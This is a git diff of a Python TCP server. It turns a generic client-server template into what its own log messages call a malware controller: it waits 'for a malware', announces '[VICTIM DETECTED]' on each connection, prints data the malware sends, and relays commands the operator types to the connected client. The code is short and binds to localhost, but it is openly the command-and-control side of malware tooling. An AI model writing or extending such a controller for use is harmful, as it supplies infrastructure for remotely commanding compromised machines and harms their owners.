@@ -1,30 +1,18 @@
-"""Local Server
+#  server.py server
 
-The origin of this code is from: 
-https://github.com/amir78729/python-TCP-client-server-template/blob/main/Server.py
-"""
-
-import socket
-import threading
-
+from socket import *
+from time import ctime
+import select 
+import sys
 
 class Server:
     def __init__(self):
-        self.PORT = 9999
+        self.HOST = 'localhost'
+        self.PORT = 12346
         self.MESSAGE_LENGTH_SIZE = 64
         self.ENCODING = 'utf-8'
-        self.ADDRESS = '127.0.0.1'
-        self.HOST_INFORMATION = (self.ADDRESS, self.PORT)
-
-    def main(self):
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(self.HOST_INFORMATION)
-        print('[SERVER STARTS] Server is starting...')
-        server.listen()
-        while True:
-            conn, address = server.accept()
-            t = threading.Thread(target=self.handle_client, args=(conn, address))
-            t.start()
+        self.ADDR = (self.HOST, self.PORT)
+        self.BUFSIZE = 1024
 
     def send_message(self, client, msg):
         message = msg.encode(self.ENCODING)
@@ -34,19 +22,40 @@ class Server:
         client.send(msg_length)
         client.send(message)
 
-    def handle_client(self, conn, address):
-        print('[NEW CONNECTION] connected from {}.'.format(address))
-        connected = True
-        while connected:
-            try:
-                message_length = int(conn.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
-                msg = conn.recv(message_length).decode(self.ENCODING)
-                print('[MESSAGE RECIEVED] {}'.format(msg))
-                if msg == 'DISCONNECT':
-                    connected = False
-            except ValueError:
-                connected = False
-        conn.close()
+    def main(self):
+        tcpServer = socket(AF_INET, SOCK_STREAM)
+        tcpServer.bind(self.ADDR)
+        tcpServer.listen(5)
+        gets = [tcpServer, sys.stdin]
+
+        while True:
+            print('{}\t[WAITING] waiting for a malware...'.format(ctime()))
+            tcpClient, addr = tcpServer.accept()
+            print('{}\t[VICTIM DETECTED] new connection from {}:{}'.format(ctime(), addr[0], addr[1]))
+            gets.append(tcpClient)
+
+            while True:
+                try:
+                    readyInput, readyOutput, readyException = select.select(gets, [], [])
+                    for indata in readyInput:
+                        if indata == tcpClient:
+                            # data = tcpClient.recv(self.BUFSIZE)
+                            message_length = int(tcpClient.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
+                            data = tcpClient.recv(message_length).decode(self.ENCODING)
+                            if not data:
+                                break
+                            print('{}\t[MESSAGE RECEIVED] malware: {}'.format(ctime(), data))
+                        else:
+                            data = input()
+                            if not data:
+                                break
+                            # tcpClient.send(bytes(data, 'utf-8'))
+                            self.send_message(tcpClient, data)
+                except ValueError:
+                    print('{}\t[CONNECTION LOST]'.format(ctime()))
+                    break
+            tcpClient.close()
+        tcpServer.close()
 
 
 if __name__ == '__main__':
